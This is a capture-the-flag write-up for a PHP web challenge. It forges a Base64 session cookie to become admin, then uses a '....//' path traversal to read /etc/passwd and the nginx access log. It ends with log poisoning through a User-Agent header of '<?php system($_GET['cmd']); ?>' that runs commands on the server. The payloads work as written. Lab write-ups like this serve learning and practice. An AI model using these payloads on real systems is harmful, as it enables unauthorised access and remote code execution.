# 🍪 Broken Production - 550pts

```
💡 Uses cookie manipulation & PHP injection into User-Agent header
```

### Enumeration

Looking at the login page, one thing of note is the `registration` redirect

- With any login page, I immediately assume that reaching `admin` status is the goal
- Create a basic account with a password and login with the account’s info
    - If watching in **BurpSuite** or navigating to ******************************Inspect Element,****************************** your cookies have changed
    - Inspect Element ⇒ Application Tab ⇒ Cookies
    
    ![image of chrome navigation to application tab](/assets/brokenproduction1.png)
    

The cookie name is `PHPSESSID` and the value should be a `Base64 encoding`

- Example: `eyJ1c2VybmFtZSI6InVzZXIifQ==` ⇒ `{"username":"user"}`
- Assuming that “admin” is a pre-existing user, changing `PHPSESSID` original value to a Base64 version of admin should validate you
    - `eyJ1c2VybmFtZSI6ImFkbWluIn0=` ⇒ `{"username":"admin"}`

You can change your cookie value by simply double-clicking or right click + “edit” on a browser

Reloading the page leads you to the `admin panel` 

---

### Admin.php

This is where I actually care about the other files provided. 

```php
<?php

$utilFile = "tickets.php";

if (isset($_GET['util']))
	$utilFile = $_GET['util'];
	$utilFile = str_replace("../","", $utilFile); // MOST ANNOYING THING EVER - Hannah

$fullPath = '/www/utils/'.$utilFile;

?>
```

Explanation:

- If the `GET` parameter is set with `util`, it will replace the file being shown on the admin screen from `tickets.php` (useless) to whatever you set after `util`
- `str_replace("../","", $utilFile);` will replace “../”  with nothingness, we will find a way around this “security measure”.
    - This is where I 100% knew it involved `directory traversal` since it tries to prevent it (badly)

---

### [Directory Traversal](https://owasp.org/www-community/attacks/Path_Traversal) <= Link to good guide

Using the URL and our admin cookie, we will try to traverse, incrementally going to the next parent directory until get to where we want

- I am putting this out here as just a thought I considered while solving:
    - This is to let you know that this could have been a possibility
    - I thought that maybe one of the [PHP files they included was actually a payload for remote code execution](https://huntr.dev/bounties/b5f31d5e-ec54-438d-903e-7656666881c8/)
- `/etc/passwd` is a common file used to demonstrate **directory traversal**
- “`….//`” is double the amount of dots and dashes for traversal to make up for half of them being deleted by `admin.php`
- The amount of parent directories that I traversed was simply determined by brute force

`http://<ip>:<>port/?util=....//....//....//....//....//etc/passwd`

The previous URL was important to determine the `full path to the root directory`

---

### logs.php

I have only included what is relevant 

```php
<div class="container">
		<p>Viewing log file : /var/log/nginx/access.log</p>
```

Now we have the path for the `access.log` file

`http://<ip>:<>port/?util=....//....//....//....//....//var/log/nginx/access.log`

- The output of this shows that there is a file named `flag_[HUMONGUS STRING OF CHARACTERS]` here

---

### [Log Poisoning Technique](https://www.notion.so/Broken-Production-550pts-aeb23c5533bf4386be3f2fc6c94490c7?pvs=21)

> ***LFI** (Local File Inclusion) is a web vulnerability that allows an attacker to access server files by manipulating paths in HTTP requests.*
> 
> 
> ***RFI** (Remote File Inclusion) is a web vulnerability that allows an attacker to include remote files in the application’s code, which can result in the execution of unauthorized code on the web server.*
> 
> ***Log Poisoning**: It involves reading a log file through a “file inclusion” (LFI) and modifying the text of the headers (e.g., User-agent) to write arbitrary code and achieve its execution (RCE) on the victim machine.*
> 

What we just did is called `LFI`, when I mentioned previously about injecting PHP code? That would be considered `RFI`

- Since `RFI` did not work, we move onto `Log Poisoning`

We will target the `User-Agent` header and change it to `inject PHP code` which allows us to execute command line functions

- **[How to Change User Agents in Chrome, Edge, Safari & Firefox](https://www.searchenginejournal.com/change-user-agent/368448/)**
- Change the User-Agent to the following:

`User-Agent: <?php system($_GET['cmd']); ?>`

Finally, utilize this new ability by formatting your last URL as so

- I put a `*` as a wildcard indicator because there was 0 way I was gonna keep the whole flag file name
- `%20` is simply a URL encoding for a space character
    - The command you want to run is just `cat /flag*` but converted ⇒ `cat%20/flag`

`http://<ip>:<>port/?util=....//....//....//....//....//var/log/nginx/access.log&cmd=cat%20/flag` 

The flag should be displayed on the webpage now
